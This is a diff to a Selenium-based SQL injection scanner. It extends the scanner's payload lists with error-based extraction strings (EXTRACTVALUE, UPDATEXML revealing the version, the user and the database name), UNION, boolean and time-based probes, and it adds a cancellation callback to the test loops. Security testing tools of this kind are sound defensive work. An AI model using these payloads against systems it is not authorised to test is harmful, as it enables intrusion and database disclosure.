@@ -11,7 +11,7 @@ from __future__ import annotations
 
 import re
 import time
-from typing import Any
+from typing import Any, Callable
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 from selenium import webdriver
@@ -49,16 +49,26 @@ PAYLOADS_QUICK = [
     '" OR "1"="1',
     "1 OR 1=1",
     "' UNION SELECT NULL--",
+    "' OR EXISTS(SELECT 1)--",
+    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))--",
+    "') OR ('1'='1'--",
 ]
 
 PAYLOADS_FULL = PAYLOADS_QUICK + [
     "1' AND '1'='2",
     "1' UNION SELECT NULL,NULL--",
     "1' UNION SELECT NULL,NULL,NULL--",
-    "admin'--",
-    "1; DROP TABLE test--",
-    "' OR ''='",
-    "1' AND SLEEP(0)--",  # safe sleep(0) to confirm syntax acceptance
+    "' UNION SELECT NULL,NULL,NULL,NULL--",
+    "' OR updatexml(1,concat(0x7e,user(),0x7e),1)--",
+    "' OR extractvalue(1,concat(0x7e,database(),0x7e))--",
+    "' OR 1=1#",
+    '" OR "1"="1"#',
+    "1' AND JSON_EXTRACT('{\"x\":1}', '$.x')=1--",
+    "1' AND JSON_KEYS('{\"x\":1}') IS NOT NULL--",
+    "1' AND IF(1=1,SLEEP(0),0)--",
+    "1' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE pg_sleep(0) END)--",
+    "1')/**/OR/**/('1'='1",
+    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
 ]
 
 
@@ -95,6 +105,7 @@ def _test_get_params(
     param: str,
     quick: bool,
     evidence_dir: str | None,
+    should_stop: Callable[[], bool] | None = None,
 ) -> dict[str, Any] | None:
     """Inject SQL payloads into a GET parameter via the browser."""
     payloads = PAYLOADS_QUICK if quick else PAYLOADS_FULL
@@ -108,6 +119,8 @@ def _test_get_params(
         baseline_hash = 0
 
     for payload in payloads:
+        if should_stop and should_stop():
+            return None
         target = _inject_param_url(url, param, payload)
         try:
             driver.get(target)
@@ -162,6 +175,7 @@ def _test_form_selenium(
     form: dict[str, Any],
     quick: bool,
     evidence_dir: str | None,
+    should_stop: Callable[[], bool] | None = None,
 ) -> list[dict[str, Any]]:
     """Inject SQL payloads into form fields using the browser."""
     findings: list[dict[str, Any]] = []
@@ -176,9 +190,13 @@ def _test_form_selenium(
         injectable = injectable[:1]
 
     for inp in injectable:
+        if should_stop and should_stop():
+            return findings
         name = inp["name"]
 
         for payload in payloads:
+            if should_stop and should_stop():
+                return findings
             try:
                 driver.get(form["action"])
                 time.sleep(0.15)
@@ -250,6 +268,7 @@ def test_sqli_selenium(
     headless: bool = True,
     quick: bool = False,
     evidence_dir: str | None = None,
+    should_stop: Callable[[], bool] | None = None,
 ) -> list[dict[str, Any]]:
     """Run SQL injection tests using a real browser.
 
@@ -272,13 +291,19 @@ def test_sqli_selenium(
 
         # ── GET parameter injection ─────────────────────────────
         for url in capped_endpoints:
+            if should_stop and should_stop():
+                log.info("Selenium SQLi cancelled during GET parameter tests")
+                break
             params = parse_qs(urlparse(url).query)
             path = urlparse(url).path
             for param in params:
+                if should_stop and should_stop():
+                    log.info("Selenium SQLi cancelled on %s", path)
+                    break
                 sig = (path, param)
                 if sig in seen:
                     continue
-                result = _test_get_params(driver, url, param, quick, evidence_dir)
+                result = _test_get_params(driver, url, param, quick, evidence_dir, should_stop)
                 if result:
                     findings.append(_to_finding(result))
                     seen.add(sig)
@@ -287,9 +312,12 @@ def test_sqli_selenium(
         form_seen: set[tuple[str, str]] = set()
         form_limit = 10 if quick else 15
         for form in forms[:form_limit]:
+            if should_stop and should_stop():
+                log.info("Selenium SQLi cancelled during form tests")
+                break
             if form["method"] != "POST":
                 continue
-            form_results = _test_form_selenium(driver, form, quick, evidence_dir)
+            form_results = _test_form_selenium(driver, form, quick, evidence_dir, should_stop)
             for r in form_results:
                 form_sig = (urlparse(r["url"]).path, r["parameter"])
                 if form_sig not in form_seen:
